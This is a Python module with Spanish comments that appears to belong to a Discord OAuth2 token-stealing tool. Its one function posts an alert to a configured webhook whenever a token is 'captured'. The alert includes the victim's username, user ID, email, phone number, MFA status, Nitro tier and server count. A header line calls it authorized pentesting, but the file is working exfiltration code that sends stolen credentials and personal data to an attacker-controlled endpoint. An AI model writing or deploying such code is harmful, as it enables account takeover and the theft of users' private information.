# webhook_alerts.py
# Envía notificaciones cuando se capturan tokens
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import requests
import logging
from config import config

logger = logging.getLogger("WebhookAlerts")

class AlertManager:
    @staticmethod
    def send_token_captured_alert(token_data):
        webhook_url = config.ALERT_WEBHOOK_URL
        if not webhook_url:
            return False

        embed = {
            "title": "🎯 Token OAuth2 Capturado",
            "color": 0x00FF00,
            "fields": [
                {"name": "Usuario", "value": token_data.get("username", "Desconocido"), "inline": True},
                {"name": "ID", "value": f"`{token_data.get('user_id', 'N/A')}`", "inline": True},
                {"name": "Email", "value": f"`{token_data.get('email', 'N/A')}`", "inline": False},
                {"name": "Teléfono", "value": f"`{token_data.get('phone', 'N/A')}`", "inline": True},
                {"name": "MFA", "value": "✅ Activado" if token_data.get("mfa_enabled") else "❌ Desactivado", "inline": True},
                {"name": "Nitro", "value": {0: "Ninguno", 1: "Nitro Classic", 2: "Nitro"}.get(
                    token_data.get("premium_type", 0), "Desconocido"), "inline": True},
                {"name": "Verificado", "value": "✅ Sí" if token_data.get("verified") else "❌ No", "inline": True},
                {"name": "Servidores", "value": str(len(token_data.get("user_guilds", []))), "inline": True},
                {"name": "Capturado desde", "value": f"Servidor `{token_data.get('guild_id', 'N/A')}`", "inline": False}
            ],
            "footer": {"text": "Pentest - Token Manager"},
            "timestamp": token_data.get("captured_at", "")
        }

        payload = {
            "embeds": [embed],
            "content": f"@here Nuevo token capturado: **{token_data.get('username')}**"
        }

        try:
            r = requests.post(webhook_url, json=payload, timeout=10)
            if r.status_code in (200, 204):
                logger.info(f"Alerta enviada para {token_data.get('username')}")
                return True
            else:
                logger.warning(f"Error enviando alerta: {r.status_code}")
                return False
        except Exception as e:
            logger.error(f"Error en webhook: {e}")
            return False

alert_manager = AlertManager()
